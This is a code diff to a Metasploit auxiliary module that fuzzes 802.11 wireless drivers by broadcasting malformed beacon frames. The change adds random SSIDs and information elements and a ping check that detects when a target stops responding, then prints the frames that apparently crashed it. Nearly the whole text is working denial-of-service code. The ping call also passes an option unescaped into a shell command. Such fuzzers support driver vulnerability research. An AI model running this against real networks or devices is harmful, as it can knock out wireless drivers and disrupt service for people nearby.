@@ -20,45 +20,97 @@ class Auxiliary::Dos::Wireless::FuzzBeacon < Msf::Auxiliary
 		))
 		register_options(
 			[
-				OptString.new('ADDR_DST', [ true,  "The MAC address of the target system",'FF:FF:FF:FF:FF:FF'])
+				OptString.new('ADDR_DST', [ true,  "The MAC address of the target system",'FF:FF:FF:FF:FF:FF']),
+				OptString.new('PING_HOST', [ false,  "Ping the wired address of the target host"])
 			], self.class)					
 	end
 
-	def run
-		open_wifi
-		print_status("Sending corrupt beacon frames...")
-		while (true)
-			wifi.write(create_frame())
+	def ping_check
+		1.upto(3) do |i|
+			x = `ping -c 1 -n #{datastore['PING_HOST']}`
+			return true if x =~ /1 received/
+			if (i > 1)
+				print_status("Host missed a ping response...")
+			end
 		end
+		return false
 	end
 	
-	def eton(addr)
-		addr.split(':').map { |c| c.hex.chr }.join
+	def run
+		
+		srand(0)
+		
+		@@uni = 0
+		
+		frames = []
+	
+		open_wifi
+		
+		print_status("Sending corrupt frames...")
+		
+		while (true)
+			frame = create_frame()
+			
+			if (datastore['PING_HOST'])
+			
+				if (frames.length >= 5)
+					frames.shift
+					frames.push(frame)
+				else
+					frames.push(frame)
+				end
+
+				1.upto(3) do 
+					wifi.write(frame)
+					if (not ping_check())
+						frames.each do |f|
+							print_status "****************************************"
+							print_status f.inspect
+						end
+						return
+					end		
+				end
+			else 
+				wifi.write(frame)
+			end
+		end
 	end
 
+
 	def create_frame
-		mtu      = 2312 # 1514
+		mtu      = 1500 # 2312 # 1514
 		ies      = rand(1024)
 
+		ssid     = Rex::Text.rand_text_alphanumeric(rand(256))
 		bssid    = Rex::Text.rand_text(6)
 		seq      = [rand(255)].pack('n')
 		
-		frame = 
+		frame =
 			"\x80" +                      # type/subtype
 			"\x00" +                      # flags
 			"\x00\x00" +                  # duration  
-			eton(datastore['ADDR_DST']) + # dst
+			"\xff\xff\xff\xff\xff\xff" +  # dst
 			bssid +                       # src
 			bssid +                       # bssid
 			seq   +                       # seq  
 			Rex::Text.rand_text(8) +      # timestamp value
-			Rex::Text.rand_text(2) +      # beacon interval
-			Rex::Text.rand_text(2)        # capability flags
-		
+			"\x64\x00" +                  # beacon interval
+			#"\x00\x05" +                  # capability flags
+			Rex::Text.rand_text(2) + 
+			
+			# ssid tag
+			"\x00" + ssid.length.chr + ssid +
+
+			# supported rates
+			"\x01" + "\x08" + "\x82\x84\x8b\x96\x0c\x18\x30\x48" +
+
+			# current channel
+			 "\x03" + "\x01" + channel.chr
+
 		1.upto(ies) do |i|
 			max = mtu - frame.length
 			break if max < 2
-			t = rand(0x30)
+			t = rand(256)
 			l = (max - 2 == 0) ? 0 : (max > 255) ? rand(255) : rand(max - 1)
 			d = Rex::Text.rand_text(l)
 			frame += t.chr + l.chr + d
